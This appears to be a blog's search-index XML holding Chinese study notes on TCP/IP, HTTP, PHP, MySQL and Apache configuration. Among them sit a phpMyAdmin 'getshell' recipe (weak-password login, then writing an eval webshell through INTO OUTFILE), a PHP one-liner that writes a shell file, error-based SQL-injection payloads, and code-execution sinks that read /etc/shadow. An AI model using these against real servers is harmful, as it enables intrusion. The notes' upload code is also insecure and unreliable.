<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[TCP/IP协议与HTTP协议]]></title>
    <url>%2F2018%2F12%2F25%2FTCPIP%E5%8D%8F%E8%AE%AE%E4%B8%8EHTTP%E5%8D%8F%E8%AE%AE%2F</url>
    <content type="text"><![CDATA[TCP/IP协议与HTTP协议一、TCP/IP协议TCP/IP协议，也称TCP/IP协议族或TCP/IP协议栈，其中： TCP：Transmission Control Protocol 传输控制协议IP： Internet Protocol 互联网协议 该协议是目前世界上应用最为广泛的协议，是以TCP和IP为基础的不同层次上多个协议的集合，两台主机要实现通讯，都必须遵守TCP/IP协议。 以下是ISO/OSI七层模型与TCP/IP四层模型对比： 区别： 1、前者是七层模型结构，后者是四层模型结构； 2、实际市场应用不同， ISO/OSI参考模型只是理论上的模型，并没有成熟的产品支持；而TCP/IP参考模型已经成为“实际上的国际标准”。 五层协议与四层协议基本相同，只不过是将网络接口层分开为物理层和数据链路层。 二、TCP三次握手和四次挥手三次握手首先看一张图片 在学习TCP协议的“三次握手”之前，先来了解TCP报文及格式：当应用层向TCP层发送用于网间传输的、用8位字节表示的数据流时，TCP会把数据流分割成适当长度的报文段，之后TCP把数据包传给IP层，由它来通过网络将包传送给接收端实体的TCP层。 三次握手流程1.第一次握手：主机A将标志位SYN置为1，随机产生一个值seq=J，并将该数据包发送给主机B，主机A进入SYN_SENT状态，等待主机B确认。 第二次握手：主机B收到数据包后由标志位SYN=1得知主机A请求建立连接，主机B将标志位SYN和ACK都置为1，ack=J+1，随机产生一个值seq=K，并将该数据包发送给主机A以确认连接请求，主机B进入SYN_RCVD状态。 3.第三次握手：主机A收到确认后，检查ack是否为J+1，ACK是否为1，如果正确则将标志位ACK置为1，ack=K+1，并将该数据包发送给主机B，主机B检查ack是否为K+1，ACK是否为1，如果正确则连接建立成功，主机A和主机B进入ESTABLISHED状态，完成三次握手，随后就可以开始传输数据了 四次挥手 在了解4次挥手之前我们要知道为什么建立连接时是3次，而关闭时却是4次呢？ 这是因为服务端的LISTEN状态下的SOCKET当收到SYN报文的连接请求后，它可以把ACK和SYN(ACK起应答作用，而SYN起同步作用)放在 一个报文里来发送。但关闭连接时，当收到对方的FIN报文通知时，它仅仅表示对方没有数据发送给你了；但未必你所有的数据都全部发送给对方了，所以你可能 未必会马上会关闭SOCKET,也即你可能还需要发送一些数据给对方之后，再发送FIN报文给对方来表示你同意现在可以关闭连接了，所以它这里的ACK报 文和FIN报文多数情况下都是分开发送的。 （1）第一次挥手：客户端发送一个FIN，用来关闭客户端到服务器的数据传送，客户端进入FIN 1状态。 （2）第二次挥手：服务器收到FIN后，发送一个ACK给客户端，确认序号为收到序号+1（与SYN相同，一个FIN占用一个序号），客户端进入CLOSE_WAIT状态。 （3）第三次挥手：服务器发送一个FIN，用来关闭服务器到客户端的数据传送，服务器进入LAST_ACK状态。 （4）第四次挥手：客户端收到FIN后，进入TIME_WAIT状态，接着发送一个ACK给服务器，确认序号为收到序号+1，进入CLOSED状态，完成四次挥手。 常用端口1234567891011121314151617181920212223242526272829303132333435363721 FTP22 SSH23 Telnet25 SMTP80 http110 pop3135 smb443 https445 共享服务1433 sql server1531 oracle3306 mysql3389 rdp远程桌面5432 postgresql6379 redis7001weblogic8080 tomcat10051 zabbix27017 mongodb 二、HTTP协议HTTP协议作用在应用层，属于应用层协议。 HTTP状态码 200 - 请求成功 301 - 资源（网页等）被永久转移到其它URL 404 - 请求的资源（网页等）不存在 500 - 内部服务器错误 | 200 | OK | 请求成功。一般用于GET与POST请求 || —- | ——————— | ———————————————————— || 400 | Bad Request | 客户端请求的语法错误，服务器无法理解 || 403 | Forbidden | 服务器理解请求客户端的请求，但是拒绝执行此请求 || 404 | Not Found | 服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面 || 405 | Method Not Allowed | 客户端请求中的方法被禁止 || 500 | Internal Server Error | 服务器内部错误，无法完成请求 || 502 | Bad Gateway | 作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应 | HTTP之URL HTTP之请求消息Request 举例： GET / HTTP/1.1 Host: 192.168.11.111:8000 Accept: / //换行 HTTP请求方法主要是GET和POST请求 GET请求举例 POST请求举例 HTTP请求头和响应头请求头： User-Agent ；浏览器的标识信息 Accept 发送的数据类型（一般有text，json,xml） Accept-Language 浏览器使用的语言 Accept-Encoding 指浏览器向中间件发送数据是使用的压缩方式 Host 访问的网站域名+端口 Cookie 网站认证信息 响应头： Date 日期时间 这个时间为GTM时间，和我们的utc时间差8个小时 Set-Cookie cookie的来源（给网站设置Cookie） Content-Type 告诉浏览器返回的内容格式 Serve 显示中间件的版本信息 X-Forwarded-By 使用的脚本语言]]></content>
      <tags>
        <tag>tcp,ip,http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP连接MySQL]]></title>
    <url>%2F2018%2F12%2F22%2FPHP%E8%BF%9E%E6%8E%A5MySQL%2F</url>
    <content type="text"><![CDATA[PHP操作MySQL数据库文中所讲不适用于实际场景，仅适用于本地练习，如有问题，后果自负 我把这个过程分成了两大块：连接和操作 连接 1234567写好配置信息，诸如：host、db_name、db_user、db_pwd等信息建立连接选择要操作的数据库设置请求和返回数据的字符集 通常我喜欢把连接这部分写入单独的文件中，每次使用时，只需要在其他页面调用即可 1include &apos;conf.php&apos;; 操作 1234567构造SQL语句执行SQL语句，如果有错，则报错从结果集中取出一行并返回关闭连接 使用mysqli扩展使用mysqli扩展需要配置php.ini配置文件中的 1extension_dir = &quot;你的php.exe的存放路径\ext&quot;; 12删除下面这句话前面的英文分号`;`;extension=php_mysqli.dll 之后重启服务即可 注：下图中$mysqli为连接的conf.php中的第二步建立连接的结果 12345678910111213141516171819202122232425include &apos;conf.php&apos;;#1.构造SQL语句，查找content表中id为1的记录$sql = &quot;SELECT * FROM content WHERE id = 1&quot;;#2.执行SQL语句$res = $mysqli-&gt;query($sql);#如果语句本身有错，则报错 if (!$res)&#123; die(&quot;SQL语句出错！&quot;.$mysqli-&gt;error); &#125;#3.fetch_assoc()从结果集中取出一行以关联数组形式返回并用foreach输出while($row = $res-&gt;fetch_assoc())&#123; foreach ($row as $key=&gt;$value)&#123; echo $key.&apos;=&apos;.$value; &#125;&#125;#4.关闭连接#mysqli-&gt;close(); 使用mysql扩展此扩展只支持PHP版本5.5以下，所以就不赘述了 使用PDO技术（防止SQL注入）操作步骤： 1234567891011121314151617181920211.配置信息2.创建PDO对象3.执行SQL语句，编码4.构造SQL语句，在变化的地方使用`?`5.编译预处理6.传值，绑定7.执行SQL语句8.判断语句9.从结果集中取出一行并返回10.输出11.关闭连接 代码实现： 123456789101112131415161718192021222324252627282930313233343536&lt;?php$mysqli_conf = array( &apos;host&apos; =&gt; &apos;127.0.0.1:3306&apos;, &apos;db_user&apos; =&gt; &apos;root&apos;, &apos;db_pwd&apos; =&gt; &apos;root&apos;, &apos;db_name&apos; =&gt; &apos;test&apos;);//创建一个PDO对象$dsn = &quot;mysql:host=127.0.0.1&quot;;$dbuser = &apos;root&apos;;$dbpass = &apos;root&apos;;$pdo = new PDO($dsn,$dbuser,$dbpass);//执行SQL语句，编码$pdo-&gt;exec(&quot;set names &apos;utf8&apos;&quot;);//构造SQL语句，在变化的地方使用?$sql = &quot;select * from content where id = ?&quot;;#编译预处理$stmt = $pdo-&gt;prepare($sql);#传值，绑定$stmt-&gt;bindValue(1,&apos;1&apos;,PDO::PARAM_STR); 第一个`1`指的是第一个`?`，第二个`1`是问号的内容#执行SQL语句$rs = $stmt-&gt;execute();#如果为真if ($rs)&#123; #PDO::FETCH_ASSOC 关联数组形式 #PDO::FETCH_NUM 数字索引形式 #从结果集中取出一行并返回 while($row = $stmt-&gt;fetch(PDO::FETCH_ASSOC))&#123; #输出 echo &quot;&lt;pre&gt;&quot;; var_dump($row); echo &quot;&lt;/pre&gt;&quot;; &#125;&#125;#关闭连接$pdo = null;]]></content>
      <tags>
        <tag>php,mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL数据库基础知识笔记]]></title>
    <url>%2F2018%2F12%2F22%2Fmysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[数据库数据库即存储数据的仓库，是一个管理数据的软件 数据库模型 关系型数据库（也称结构化数据库） MySQL：轻量级开源数据库，适用于中小型企业，性能较好 MSSQL(SQL server)：微软开发的，适用于中大型企业，需要微软系统作为支撑，不支持跨平台 Oracle：收费，适用于大型企业的需求，支持跨平台，需要良好的硬件配置作为支撑 DB2 …… 非关系型数据库（也称非结构化数据库） redis、mongodb、Hbase、nosql等 关系型数据库结构 数据库：可以看成是一个“文件柜”中的“小格子” 数据表：可以看成是一个具体的“文件” 记录、字段、数据 一行，即一条记录 一列，即一个字段 行列交叉处，即数据 MySQL登录和退出登录MySQL有两种方式，一种是通过命令行登录进行操作，一种是通过工具登录进行操作，下面介绍通过DOS命令行进行登录 配置环境变量如果想在任意位置登录MySQL，则需要配置环境变量，如何判断是否配置好，可通过查看MySQL版本的命令进行判断： 1mysql -V #切记是大写的`V` 如果出现如下情况即没有配置好： 1‘mysql -V 不是内部或外部命令，也不是可运行的程序或批处理文件。 接下来进行配置，win7路径如下： 1win7--&gt;计算机--&gt;属性--&gt;高级系统设置--&gt;高级--&gt;环境变量--&gt;系统变量--&gt;Path 大差不差，网上教程很多，配一下就完事儿了，此处省略**字 登录在DOS命令行中，执行以下命令： 1mysql -h 主机名 -u 用户名 -p 密码 -h：代表MySQL数据库主机名。本地主机名如：127.0.0.1。MySQL数据库默认端口号：3306 -u：代表MySQL用户名。如：root -p：代表MySQL密码。如：root。在登录时，可以先不输入密码值 如： 1mysql -h127.0.0.1 -uroot -proot 退出1exit 重置密码如果忘记密码，莫慌，老夫看你骨骼惊奇，这个重置密码的方法，就赐予你了： phpstudy重置数据库密码：1其他选项菜单--&gt;mysql工具--&gt;重置密码 Linux（centos7）修改root密码： MySQL版本低于8： 1234567891011121.修改配置文件：vi /etc/my.cnf 添加：skip-grant-tables 重启MySQL服务2.空密码登录： mysql -uroot3.改密码：update mysql.user set authentication_string=password(‘root&apos;),plugin=&apos;mysql_native_password&apos; where user=&apos;root&apos; and host=&apos;localhost&apos;;4.更新数据库：flush privileges;5.退出6.再次修改配置文件，注释掉skip-grant-tables，重启MySQL服务，即可 MySQL版本为8及以上： 这里改的是初始密码 1234567891.查看原始密码：(两种方法) 1). grep &quot;password&quot; /var/log/mysqld.log 2). cat /var/log/mysqld.log | grep &quot;password&quot; 2.使用原始密码登录： mysql -uroot -p3.执行命令： ALTER USER &quot;root&quot;@&quot;localhost&quot; IDENTIFIED BY &quot;你的密码&quot;;4.重启服务即可 重置过密码后忘记密码 123456789101112131415161.修改配置文件：vi /etc/my.cnf 添加：skip-grant-tables 重启MySQL服务2.空密码登录： mysql -uroot3.清空:authentication_string字段,设置对应的host:%update user set host=&apos;%&apos; where user=&apos;root&apos;;update user set authentication_string=&apos;&apos; where user=&apos;root&apos;4.退出exit5.修改配置文件，注释掉步骤一，重启MySQL服务6.空密码登录： mysql -uroot7.alter user&apos;root&apos;@&apos;%&apos; IDENTIFIED BY &apos;你的密码@123&apos;; 允许外界连接的方法 改表法 123456789进入MySQL，执行以下命令：首先要能远程访问，修改root的host为%update user set host=&apos;%&apos; where user=&apos;root&apos;;GRANT ALL ON *.* TO &apos;root&apos;@&apos;%&apos;;其次，修改连接方式：ALTER USER &apos;root&apos;@&apos;%&apos; IDENTIFIED WITH mysql_native_password BY &apos;你的数据库密码&apos;;注意修改防火墙规则或者关闭防火墙 授权法 1天将降大任于斯人也，enmmmmmm...交给你去研究了 数据类型1234567891011121314整型 INT浮点型 FLOAT日期 DATE YYYY-MM-DD时间 TIME HH-MM-SS时间戳 TIMESTAMP字符 CHAR VARCHAR 文本 TEXT MySQL数据库操作在MySQL交互式环境中，所有命令必须以英文分号;结束 MySQL不区分大小写，但是把系统命令和自定义值以大小写区分会便于查看和排错 显示数据库1SHOW DATABASES; 创建数据库12交互式环境： CREATE DATABASE [IF NOT EXISTS] 数据库名 [CHARSET UTF8];DOS命令行： mysqladmin -uroot -proot CREATE DATABASE 数据库名; IF NOT EXISTS：可选项，如果不存在，则创建数据库 数据库名：自定义 CHARSET：设置数据库的默认字符集 删除数据库1DROP DATABASE [IF EXISTS] 数据库名; 查看数据库的字符集1SHOW CREATE DATABASE 数据库名; 通过MySQL命令修改数据库的字符集 1ALTER DATABASE 数据库名 DEFAULT CHARACTER SET gbk; MySQL数据表操作选择数据库只有进入数据库里，才能操作数据表 1USE 数据库名; 显示当前库中所有的数据表1SHOW TABLES; 创建数据表1CREATE TABLE 表名(字段1 字段1类型 字段1属性,字段2 字段2类型 字段2属性,……) 字段类型：tinyint、int、bigint、char、varchar、text、date、time等 字段属性： NOT NULL|NULL：是否可以为空 DEFAULT default_value：指该列的默认值 default_value默认值可以是字符串，也可以是整型 AUTO_INCREMENT：该列为自动增长型，或者自动编号。要求该列必须是整型。一个表只能有一个auto_increment属性。 PRIMARY KEY：主键。指定该列的值具有唯一性，主键所在的列不能为空。一个表的主键只能有一个。 一个数据表，由多个列构成。多个列定义之间用英文下的逗号隔开。 删除数据表1DROP TABLE [IF EXISTS] table_name; 修改数据表 这么麻烦的语句，你要用吗？删了在创建一个不就完事儿了 describe显示表的结构定义1DESCRIBE 表名; 或 DESC 表名; SQL基础增删改查增加记录1INSERT INTO 表名(字段1,字段2,字段3,…) VALUES (值1,值2,值3,…) 删除记录1DELETE FROM 表名 [WHERE 条件] WHERE条件：如果省略，将删除所有记录 修改记录1UPDATE 表名 SET 字段1 = 新值1，字段2=新值2,… [WHERE条件] 需要更新的字段列出，不需要更新的不用管它 字段的顺序可以修改 WHERE条件不能省略，如果省略，所有记录都会修改 查询记录1SELECT 字段列表|* FROM 表名 [WHERE条件] [ORDER BY排序][LIMIT限制输出] 字段字列表：查询某些字段的数据，各字段之间用逗号隔开，字段之间没有顺序 ：表示显示所有列的数据。如：select from news; where：指查询的条件 ORDER BY：字段排序 LIMIT：限制输出 条件判断WHERE 123SELECT * FROM news WHERE id&lt;100;SELECT * FROM news WHERE id&lt;100 and hits&lt;100;SELECT * FROM news WHERE id=100 OR hits&lt;50; ORDER BY123order by n 如果后面跟数字，是按照第n列数据排序，如果n超过字段数，就报错ERROR 1054 (42S22): Unknown column &apos;5&apos; in &apos;order clause&apos; 由此可判断此表有几列 LIMIT 限制输出1LIMIT startrow,pagesize; startrow从指定的行数起，开始返回数据 pagesize返回的记录数 举例： 123LIMIT 0,10; //从第0行起，返回10条记录LIMIT 10,10; //从第10行起，返回10条记录LIMIT 20,10; //从第20行起，返回10条记录 LIKE12345通配符： * 表示任意的字符 % 表示任意的字符 ？ 表示一个字符SELECT * FROM 表名 WHERE 字段名 LIKE &apos;字符串&apos;; 其中字符串可用通配符 UNION 联合查询1SELECT 字段列表|* FROM 表1 UNION SELECT 字段列表|* FROM 表2; 表1和表2中字段数应相同 DISTINCT 去重1SELECT DISTINCT field FROM table_name [WHERE 条件]； GROUP_CONCAT 把查询结果链接一起1SELECT group_concat(DISTINCT field) FROM table_name [WHERE 条件] ； 常用函数 数据库信息类 12345678910111213141516171819version() 显示数据库版本信息connection_id() 显示当前连接数user() 当前用户（current_user()、system_user()、session_user()）database() 查看当前使用的数据库schema() 查看当前使用的数据库@@hostname 获取当前计算机名称@@tmpdir 存放临时文件的路径@@datadir 存放数据的路径@@version 数据库版本@@basedir 数据库所在位置 字符串操作类 123456789101112131415161718mid(string,start,length) 用来截取字符串中一部分SUBSTRING（str,start,length） 把str从start个字符开始截取length个字符，并输出ord() 用来显示字符的ASCII码concat() 拼接字符串concat_ws() 使用分隔符来拼接字符串第一个参数是分隔符，支持16进制，不能用单双引号包括 group_concat() 和concat类似，拼接并分组显示数据INSERT(str1,start,length,str2) 把str1的第start个字符往后的length个字符替换为str2 LEFT(str,length) 把str从左边开始截取length个字符并输出RIGHT(str,length) 把str从右边开始截取length个字符并输出 其他 1SLEEP(5) 让服务器等待5秒后返回0 报错函数 extractvalue 12345extractvalue(XML_document，XPath_string): 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 第二个参数：XPath_string (Xpath格式的字符串) 作用：从目标XML中返回包含所查询值的字符串 select * from news where tid=1 and extractvalue(1,concat(0x7e,(select user()),0x7e)); UPDATEXML 123456UPDATEXML (XML_document, XPath_string, new_value); 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 第三个参数：new_value，String格式，替换查找到的符合条件的数据 作用：改变文档中符合条件的节点的值 select * from news where tid=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1)); 导入导出数据导入数据123451.mysql命令导入 mysql -uroot -proot &lt; 文件路径2.source命令导入3.使用 LOAD DATA 导入数据 导出数据 第一种方法 1SELECT * FROM 表名 INTO OUTFILE &quot;路径+文件名&quot;; 如果出错，以下为解决办法： 12ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement 123456789101112131415执行命令（查看相关配置）：SHOW GLOBAL VARIABLES LIKE &apos;%secure_file_priv%&apos;;secure_file_priv 为 NULL 时，表示限制mysqld不允许导入或导出。secure_file_priv 为 /tmp （路径）时，表示限制mysqld只能在/tmp目录（路径）中执行导入导出，其他目录不能执行。secure_file_priv 没有值时，表示不限制mysqld在任意目录的导入导出。永久解决办法： 修改配置文件my.ini，添加如下语句： secure_file_priv= //表示可导入导出到任意目录 临时解决办法： set global secure_file_priv=&apos;&apos;; 第二种方法 12345mysqldump -uroot -p db_name &gt; ./db_name.sql 在DOS命令下运行mysqldump -u 用户名 -p 数据库名 &gt; 导出的文件名mysqldump -u 用户名 -p 数据库名 表名 &gt; 导出的文件名 彩蛋 通过phpmyadmin来getshell12345671. 首先通过google hacking找到phpmyadmin的网站2. 弱口令登录，SHOW GLOBAL VARIABLES LIKE &apos;%secure_file_priv%&apos;;判断我们有没有权限去写木马文件3. 执行SQL语句，查看数据库所在位置：select @@basedir;4. 猜测根目录写入木马文件：`select &apos;&lt;?php eval($_POST[_]);?&gt;&apos; into outfile &apos;G;//shell.php&apos;`：注意：写木马的路径，一般是`/var/www/html`]]></content>
      <tags>
        <tag>mysql,笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP文件包含、cookie、文件上传]]></title>
    <url>%2F2018%2F12%2F18%2FPHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E3%80%81cookie%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%2F</url>
    <content type="text"><![CDATA[PHP文件包含、cookie、文件上传一、文件包含在 PHP 中，可以在服务器执行 PHP 文件之前在该文件中插入一个文件的内容。 include 和 require 语句用于在执行流中插入写在其他文件中的有用的代码。 两者之间的区别在于： include生成一个警告，在错误发生后依然会执行。 require生成一个致命错误，在错误发生时就会停止执行。 123include &apos;head.php&apos;; include会在PHP文件开始运行的时候包含require &apos;tail.php&apos;; require会在PHP文件运行到require关键字时包含 include_once和require_once表示只包含一次 123include_once &apos;head.php&apos;;require_once &apos;tail.php&apos;; 二、cookie和session2.1cookiecookie 常用于识别用户。cookie 是一种服务器留在用户计算机上的小文件。每当同一台计算机通过浏览器请求页面时，这台计算机将会发送 cookie。通过 PHP，您能够创建并取回 cookie 的值。 setcookie()函数用来设置cookie 注意：setcookie()函数必须位于&lt;html&gt;标签之前。 创建一个名为 “user” 的 cookie，并为它赋值 “runoob”。并规定了此 cookie 在一小时后过期： 123&lt;?phpsetcookie(&quot;user&quot;, &quot;runoob&quot;, time()+3600);?&gt; 2.1.1取回cookie值$_COOKIE 变量用于取回 cookie 的值。 取回名为 “user” 的 cookie 的值，并把它显示在了页面上： 1234567&lt;?php// 输出 cookie 值echo $_COOKIE[&quot;user&quot;];// 查看所有 cookieprint_r($_COOKIE);?&gt; 2.1.2删除cookie删除cookie很简单，只要将日期改为过去的时间点。 1234&lt;?php// 设置 cookie 过期时间为过去 1 小时setcookie(&quot;user&quot;, &quot;&quot;, time()-3600);?&gt; 2.2sessionSession 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的。 在把用户信息存储到 PHP session 中之前，首先必须启动会话。 注意：session_start() 函数必须位于&lt;html&gt; 标签之前： 1234567&lt;?php session_start(); ?&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 2.2.1存储session存储和取回 session 变量的方法是使用 PHP $_SESSION 变量： 12345678910&lt;?phpsession_start();// 存储 session 数据$_SESSION[&apos;views&apos;]=1;?&gt;&lt;?php// 检索 session 数据echo &quot;检索&quot;. $_SESSION[&apos;views&apos;];?&gt; 2.2.2删除session删除session数据，可以使用 session_destroy() 函数。 session_destroy() 函数是彻底销毁 session 123&lt;?phpsession_destroy();?&gt; 三、文件上传PHP可以把文件上传到服务器中。 文件上传的HTML表单，代码会在查看页面时出现上传界面 1234&lt;from&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/from&gt; 在PHP中可以写上传文件的代码 在这里限制了只能上传jpg和png格式的文件如果上传的文件与规定上传的文件格式不匹配，是不允许上传的。 在上传后，文件将会存储在用户指定的文件夹 12345678910111213141516&lt;?php$ext_arr = array(&apos;jpg&apos;, &apos;png&apos;); if (isset($_FILES[&apos;file&apos;]))&#123; if ($_FILES[&apos;file&apos;] [&apos;error&apos;] == 0 )&#123; if (in_array($filename, $ext_arr) === false) &#123; echo &quot;上传文件扩展名是不允许的扩展名。&quot;; &#125;else &#123; $ok = move_uploaded_file($_FILES[&apos;file&apos;] [&apos;tmp_name&apos;], &apos;./picture/&apos; . $_FILES[&apos;file&apos;] [&apos;name&apos;]); if ($ok) &#123; echo &apos;文件保存在: ./picture/&apos; . $_FILES[&apos;file&apos;] [&apos;tmp_name&apos;]; &#125; else &#123; echo &apos;文件上传失败&apos;; &#125; &#125;?&gt; 在文件夹中的存储方式是： 12345678910111213&lt;?phpif ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)&#123; echo &quot;错误：&quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;;&#125;else&#123; echo &quot;上传文件名: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br&gt;&quot;; echo &quot;文件类型: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br&gt;&quot;; echo &quot;文件大小: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; kB&lt;br&gt;&quot;; echo &quot;文件临时存储的位置: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];&#125;?&gt;]]></content>
      <tags>
        <tag>php,文件包含,cookie,session,文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php表单+文件+代码、命令执行]]></title>
    <url>%2F2018%2F12%2F17%2Fphp%E8%A1%A8%E5%8D%95%2B%E6%96%87%E4%BB%B6%2B%E4%BB%A3%E7%A0%81%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%2F</url>
    <content type="text"><![CDATA[表单处理 三种接收表单数据的方式$_GET、$_POST、$_REQUEST 特性： 超全局变量 都是数组 121. $_GET 此方式接收表单的method=&apos;get&apos;方式传递的值 122. $_POST 此方式接收表单的method=&apos;post&apos;方式传递的值 123. $_REQUEST 此方式接收表单get/post方式传递的值 超全局变量$_SERVER：用于收集客户端请求信息 1234567$_SERVER[&apos;SERVER_ADDR&apos;] 返回当前运行脚本所在的服务器的IP地址$_SERVER[&apos;REMOTE_ADDR&apos;] 返回浏览当前页面的用户的IP地址$_SERVER[&apos;SERVER_NAME&apos;] 服务器主机名$_SERVER[&apos;REMOTE_HOST&apos;] 用户的主机名$_SERVER[&apos;REMOTE_PORT&apos;] 用户连接到服务器的端口号$_SERVER[&apos;HTTP_HOST&apos;] 返回来自当前请求的Host头$_SERVER[&apos;HTTP_REFERER&apos;] 来源IP地址（从哪个IP地址跳转过来的） 文件操作 fopen()：打开文件 1fopen(文件名,打开文件的方式); 打开文件常用的方式： r：只读方式打开，指针位置在文件开头 r+：读写方式打开，指针位置在文件开头 w：写入方式打开，清空文件内容，如果文件不存在则创建 w+：读写方式打开，清空文件内容，如果文件不存在则创建 a：追加，打开并向文件末尾进行写操作，如果文件不存在则创建 a+：可读并追加。通过向文件末尾写内容，来保持文件内容 x：只写，创建新文件。如果文件已存在，则返回FALSE和一个错误 x+：读写，创建新文件。如果文件已存在，则返回FALSE和一个错误 fgets()：逐行读取文件，每次只读取一行 1fgets(文件名); fread()：按长度读取文件的内容 1fread(文件名，长度); 换行也算一个长度 fwrite()：写入文件 1fwrite(文件名，内容); fputs：fwrite()的别名 fclose()：关闭一个打开的文件 1fclose(文件名); feof()：检测指针是否已到达文件末尾 可以结合while循环来读取文件中所有的内容 123456$file = fopen(&apos;a.txt&apos;,&apos;r&apos;);while(!feof($file)) //如果达到末尾，会返回TRUE&#123; echo fgets($file);&#125;fclose($file); unlink()：删除文件 opendir()：打开文件夹 1$file = opendir(目录); readdir()：读取文件夹（从目录句柄中读取条目） 1readdir($file); closedir()：关闭文件夹 1closedir($file); file_exists()：检查文件或目录是否存在 copy()：复制文件 1copy(源文件名,复制后的文件名); 可以移动的同时重命名文件 rename()：重命名文件或目录 1rename(源文件名,新文件名); file_get_contents()：把整个文件读入一个字符串中 1file_get_contents(文件[,include_path,context,start,max_length]) file_put_contents：把一个字符串写入文件中 1file_put_contents(string $filename,$data) 用文件操作写一句话： 1&lt;?php fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[&apos;cmd&apos;]);?&gt;&apos;);?&gt; 代码执行 eval() 123函数里可以使用单引号或者双引号使用单引号：变量不转义使用双引号：变量被转义 assert() preg_replace()：正则里面使用/e模式 1@preg_replace(&quot;/abc/e&quot;,$_REQUEST[&apos;cmd&apos;],&quot;abcd&quot;); create_function()：创建函数 1$func = create_function(&apos;&apos;,$_REQUEST[&apos;cmd&apos;]); $func(); $_GET[&#39;a&#39;]($_GET[&#39;b&#39;])：动态创建函数 12要求：PHP版本5.2以下才可以使用在地址栏中使用：a=assert&amp;b=phpinfo() 即可打印PHPinfo 命令执行 exec()：使用它必须在第二个参数指定一个变量来接收执行的命令 12exec(&quot;cat /etc/shadow&quot;,$output);echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;; system()：命令会直接执行，无需变量接收 1system(&quot;phpinfo()&quot;); popen()：此函数是打开一个进程，可读取此进程的结果 123$file = popen(&quot;cat /etc/shadow&quot;,&apos;r&apos;);echo fread($file,5000);pclose($file); shell_exec()：此函数需要一个变量在外接收它的结果并输出 12$output = shell_exec(&apos;ls -al&apos;);echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;]]></content>
      <tags>
        <tag>php,表单处理,文件,代码执行,命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache配置和虚拟主机]]></title>
    <url>%2F2018%2F12%2F14%2Fapache%E9%85%8D%E7%BD%AE%E5%92%8C%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%2F</url>
    <content type="text"><![CDATA[Apache配置 Apache主配置文件名：httpd.conf 每次修改完必须重启服务才能生效 检查Apache主程序是否有语法错误： 1在命令行中，输入：httpd.exe -t 前提是配置好环境变量或者在主程序目录中执行 DocumentRoot：网站根目录 12DocumentRoot &quot;E:\WWW&quot;路径不能有中文，空格 DirectoryIndex：网站默认首页文件 12DirectoryIndex index.html index.php如果不指定的话，会显示目录列表，如果禁止显示，则什么都没有 Listen：当Apache启动后，会等待请求的进入，监听本机指定IP地址和端口的访问，就像酒店的迎宾员，你去不去，他都在门口等着你。。。 12345语法：Listen [IP][:端口号]如： Listen 80 监听本机的所有IP地址的80端口的请求 Listen 192.168.3.100 监听本机的指定IP地址的所有端口的访问 Listen 192.168.3.100:80 监听本机的指定IP地址的80端口的访问 &lt;Directory&gt;&lt;/Directory&gt;：设置网站根目录的客户端访问权限 123456789语法： 1.指定网站根目录：DocumentRoot &quot;E:\WWW&quot; 2.给网站根目录指定访问权限 &lt;Directory &quot;E:\WWW&quot;&gt; Options 如果首页文件不存在，是否显示列表 Order 指定Deny(禁止)和Allow(允许)的执行顺序 Deny 禁止哪些外部IP访问你的主机 Allow 允许哪些外部IP访问你的主机 &lt;/Directory&gt; 12345678910111213141516参数说明： Options：指定服务器将启用哪些服务器特性。取值：None、All、Indexes None：禁止启用服务器特性(啥也看不见) All：开启所有服务器特性 Indexes：如果首页文件不存在，则显示目录列表 +Indexes：显示 -Indexes：不显示 Order：指定Allow和Deny的执行顺序 Order Allow,Deny 先允许访问，在禁止指定IP访问(黑名单) Order Deny,Allow 先禁止所有访问，再指定IP访问(白名单) Deny：禁止哪些IP访问你的主机 Deny from all 禁止所有IP访问你的主机，包括自己 Deny from 192.168.3.123 禁止指定IP访问你的主机 Deny from 192.168.3.123 192.168.3.133 同时禁止两个外部IP访问你的主机 Deny from 192.168.3 禁止192.168.3.0到192.168.3.255之间所有IP访问 Allow：允许哪些IP访问你的主机 如果输入域名/IP后显示Forbidden，被禁止了，就先找默认首页文件，然后再找目录列表 ServerName：本地域名 1ServerName localhost 虚拟主机 概念：将一台真实的主机划分成若干个”小空间”，对外”出租”，每一个”小空间”都具有网站的完整功能 